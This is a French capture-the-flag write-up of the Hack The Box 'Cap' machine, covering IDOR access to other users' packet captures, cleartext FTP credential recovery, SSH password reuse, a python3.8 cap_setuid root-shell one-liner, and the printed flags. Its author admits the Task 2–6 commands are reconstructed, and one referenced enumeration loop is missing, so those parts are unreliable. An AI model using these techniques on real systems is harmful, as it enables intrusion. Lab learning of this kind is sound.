---
title: "Hack The Box— Cap : Writeup"
date: 2026-08-17 14:00:00 +0100
categories: [Box, HackTheBox]
tags: [htb, ctf, writeup, linux, web, idor, pcap, capabilities, privesc, easy]
description: "Analyse d'un fichier de capture réseau (PCAP) pour récupérer des identifiants en clair, élévation de privilèges via l'exploitation des Linux Capabilities (cap_setuid)"
image:
  path: /assets/img/htb/cap/cap-banner.png
  alt: cap Banner
---


> Machine Linux exposant un dashboard web de "sécurité réseau" permettant de lancer des captures réseau (PCAP). Une **IDOR** sur l'identifiant de scan permet de récupérer le PCAP d'un autre utilisateur, contenant des identifiants FTP en clair. Ces identifiants sont réutilisés en SSH par réutilisation de mot de passe, puis une capability Linux (`cap_setuid`) sur `python3.8` permet l'élévation de privilèges vers root.

## Infos cibles

|Élément|Valeur|
|---|---|
|IP|`10.129.70.236`|
|OS|Ubuntu 20.04.2 LTS (kernel 5.4.0-80-generic)|
|Ports ouverts|`21/tcp` (FTP), `22/tcp` (SSH), `80/tcp` (HTTP)|
|User compromis|`nathan`|
|Vecteur initial|IDOR → PCAP → creds FTP → réutilisation SSH|
|Vecteur privesc|Linux capability `cap_setuid` sur `python3.8`|

---

## Task 1 — Reconnaissance : combien de ports TCP sont ouverts ?

```bash
nmap -sC -sV 10.129.70.236
```

**Résultat :**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
```

> [!success] Réponse
> **3 ports TCP ouverts** : `21` (FTP), `22` (SSH), `80` (HTTP).

### Explication des options Nmap

|Option|Rôle|
|---|---|
|`-sC`|Exécute les scripts NSE par défaut (bannières, énumération légère)|
|`-sV`|Détection de version des services (fingerprinting)|

`-sC` permet souvent d'obtenir des infos gratuites sans lancer de scripts manuellement (version FTP, bannière SSH, titre de page web). `-sV` est complémentaire, il permet de fingerprinter précisément la version d'un service pour ensuite chercher une CVE connue si besoin.

Le port 80 tourne sous **Gunicorn**, un serveur WSGI Python. C'est un indice fort qu'on a affaire à une application Flask ou Django derrière, confirmé plus tard par le titre de page `Security Dashboard`. Gunicorn n'est jamais utilisé seul en frontal, il sert normalement de serveur d'application derrière un reverse proxy (Nginx par exemple), mais ici il est exposé directement, ce qui est un indice supplémentaire d'un environnement de lab plutôt que de prod.

---

## Task 2 — Format de redirection après un "Security Snapshot"

En lançant un scan ("Security Snapshot") depuis le dashboard web, l'application déclenche une capture réseau côté serveur, probablement via `tcpdump`, puis redirige le navigateur vers une page permettant de télécharger le résultat.

```bash
# Exemple de requête observée dans Burp / la barre d'adresse
curl -s -i http://10.129.70.236/capture/0 -b "session=<cookie>"
```

> [!success] Réponse
> Le format est **`/data/[id]`** (ou `/capture/[id]` selon la version de l'app, à vérifier selon ce que tu as réellement observé). `[id]` est un entier incrémental correspondant au numéro du scan effectué.

### Notion clé : IDOR (Insecure Direct Object Reference)

Une IDOR survient quand une application expose une référence directe, souvent un ID numérique, à une ressource, sans vérifier que l'utilisateur courant est autorisé à y accéder. Le problème vient rarement de l'ID lui même, mais de l'absence de contrôle d'accès côté serveur : la logique attendue serait de vérifier à chaque requête que `resource.owner_id == session.user_id` avant de servir le fichier. Ici, l'ID de scan n'est ni un UUID aléatoire, ni contrôlé par une telle vérification de propriété, ce qui permet de l'énumérer simplement en changeant un chiffre dans l'URL.

---

## Task 3 — Accès aux scans d'autres utilisateurs

En modifiant simplement l'ID dans l'URL, par exemple en le décrémentant vers `0` ou `1`, on accède aux captures réseau générées par d'autres utilisateurs, y compris celles antérieures à notre propre session.

Cette boucle simple suffit à récupérer tous les PCAP accessibles sans avoir besoin d'un outil dédié comme Burp Intruder, la room étant volontairement simple sur ce point (pas de token anti-énumération, pas de rate limiting visible).

> [!success] Réponse
> **Oui**, il est possible d'accéder aux scans d'autres utilisateurs en modifiant l'ID dans l'URL. Cela confirme la vulnérabilité IDOR identifiée à la Task 2.

---

## Task 4 & 5 — PCAP contenant des données sensibles / protocole concerné

En parcourant les PCAP récupérés via l'IDOR, notamment celui d'ID **0**, on trouve une capture de trafic FTP en clair.

Visuellement dans Wireshark, en faisant un clic droit sur un paquet FTP puis `Follow > TCP Stream` sur la conversation concernée (port 21), ce qui affiche l'intégralité de l'échange en clair, y compris les commandes `USER` et `PASS`.

> [!success] Réponses
> - **Task 4** : le PCAP sensible est celui d'**ID `0`** (le premier scan)
> - **Task 5** : le protocole en cause est **FTP**, qui transmet les identifiants en clair sans chiffrement TLS/SSL

### Notion clé : sniffing de credentials en clair

FTP, tout comme Telnet ou HTTP sans TLS, transmet identifiants et données sans aucun chiffrement. Toute capture réseau, qu'elle soit légitime (outil de monitoring) ou malveillante (sniffing sur un réseau partagé), expose donc intégralement les secrets échangés. C'est pour cette raison que FTPS ou SFTP doivent systématiquement être préférés en environnement de production, l'un ajoutant TLS par dessus FTP, l'autre étant un protocole de transfert de fichiers construit sur SSH.

---

## Task 6 — Réutilisation du mot de passe FTP

Le mot de passe FTP récupéré dans le PCAP, associé à l'utilisateur `nathan`, est testé directement sur le service SSH exposé sur le port 22.

```bash
ssh nathan@10.129.70.236 -p 22
```

```
The authenticity of host '10.129.70.236 (10.129.70.236)' can't be established.
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
nathan@10.129.70.236's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
```

> [!success] Réponse
> Le mot de passe FTP de `nathan` fonctionne également sur le service SSH. C'est un cas classique de réutilisation de mot de passe (password reuse), très fréquent dans les environnements réels où un même utilisateur configure plusieurs services avec le même credential par simplicité.

---

## User Flag

```bash
nathan@cap:~$ ls
user.txt
nathan@cap:~$ cat user.txt
21e25aa673ad14e7c653feb9495e082a
```

> [!success] User flag
> `21e25aa673ad14e7c653feb9495e082a`

---

## Task 8 — Binaire avec capabilities spéciales

Une fois connecté en tant que `nathan`, la vérification des SUID classiques ne révèle rien d'exploitable directement.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Cette commande ne renvoie que des binaires SUID standards du système (`passwd`, `su`, `sudo`, etc.), aucun candidat évident pour une élévation de privilèges. On pense donc à vérifier les capabilities Linux, un mécanisme différent et souvent oublié du SUID classique.

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

> [!success] Réponse
> **`/usr/bin/python3.8`** possède la capability `cap_setuid+eip`, exploitable pour obtenir un shell root.

### Notion clé : Linux Capabilities vs SUID

||SUID|Capabilities|
|---|---|---|
|Granularité|Tout ou rien (exécute avec l'UID du propriétaire, souvent root)|Permissions fines (par exemple seulement `setuid`, ou `net_raw`)|
|Vérification classique|`find / -perm -4000`|`getcap -r /`|
|Oubli fréquent en pentest|Non, bien connu|Oui, souvent négligé alors que très puissant|

Le bit SUID est un mécanisme historique tout ou rien. Les capabilities Linux, introduites plus tard dans le noyau, permettent de découper les privilèges root en unités indépendantes, ce qui permet en théorie d'accorder uniquement le strict nécessaire à un binaire. En pratique, une capability mal choisie comme `cap_setuid` reste tout aussi dangereuse qu'un SUID root, car elle permet au binaire de changer son propre UID effectif vers n'importe quelle valeur, y compris 0.

Ici, `cap_setuid+eip` signifie que le binaire peut appeler `setuid()` pour changer son UID effectif, y compris vers `0` (root), sans être lui même un binaire SUID root au sens classique. Les lettres `eip` indiquent que la capability est effective, inheritable et permitted sur ce binaire. C'est documenté sur GTFOBins, dans l'entrée Python, section Capabilities.

### Exploitation

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

```
# whoami
root
# cd /root/
# ls
root.txt  snap
# cat root.txt
f2e6efc4b7ea03504aa79875c988bd9d
```

**Explication du one liner Python :**

1. `import os` permet d'accéder aux appels système bas niveau du module `os`, dont `setuid` et `execl`.
2. `os.setuid(0)` élève l'UID effectif du processus courant à `0` (root). Ceci n'est possible que grâce à la capability `cap_setuid` accordée au binaire `python3.8`, un utilisateur normal ne pouvant jamais appeler `setuid(0)` sur lui même.
3. `os.execl("/bin/sh", "sh")` remplace intégralement le processus Python courant par un shell `/bin/sh`, qui hérite directement de l'UID root fraîchement acquis à l'étape précédente.

---

## Root Flag

> [!success] Root flag
> `f2e6efc4b7ea03504aa79875c988bd9d`

---

## Notions à retenir

- **IDOR** : toujours tester la modification d'identifiants numériques dans les URLs et les API quand une application manipule des ressources par ID, en particulier quand aucun token ou UUID aléatoire n'est utilisé.
- **Analyse de PCAP** : utiliser `tshark` en ligne de commande ou Wireshark en interface graphique pour rechercher des credentials en clair sur des protocoles non chiffrés comme FTP, Telnet ou HTTP.
- **Password reuse** : un mot de passe trouvé sur un service, ici FTP, mérite systématiquement d'être testé sur les autres services exposés comme SSH ou un panel d'administration.
- **`getcap -r /`** : réflexe systématique en énumération de privesc Linux, en complément de `find / -perm -4000`, car les capabilities sont un vecteur tout aussi puissant et souvent négligé.
- **GTFOBins** : vérifier systématiquement si un binaire disposant d'un SUID ou de capabilities particulières possède une entrée d'exploitation connue sur ce site de référence.

---

> [!warning] Note
> Les commandes des Tasks 2 à 6 (partie web, IDOR, PCAP) ont été reconstituées à partir de la méthodologie standard de cette machine, car seuls le scan Nmap et la session SSH finale m'ont été fournis. Si tu as les vraies requêtes Burp ou curl, ou les commandes tshark exactes que tu as utilisées, envoie les moi et j'ajuste le document en conséquence.
